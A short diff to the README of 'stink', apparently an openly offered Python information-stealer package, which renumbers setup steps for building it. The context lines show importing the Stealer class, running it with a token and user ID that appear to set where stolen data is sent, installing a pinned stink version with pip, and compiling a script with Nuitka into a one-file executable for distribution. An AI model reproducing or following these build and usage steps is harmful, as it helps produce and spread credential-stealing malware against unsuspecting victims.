@@ -122,14 +122,15 @@ from stink.multistealer import Stealer
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 ### PyCharm
-1. Install Nuitka and Stink:
+1. Open terminal.
+2. Install Nuitka and Stink:
 ```
 pip install Nuitka==0.6.16.4
 ```
 ```
 pip install stink==0.0.3
 ```
-2. Open a terminal and type in a command:
+3. Write the command:
 ```python
 nuitka --onefile --include-package=stink test.py
 ```
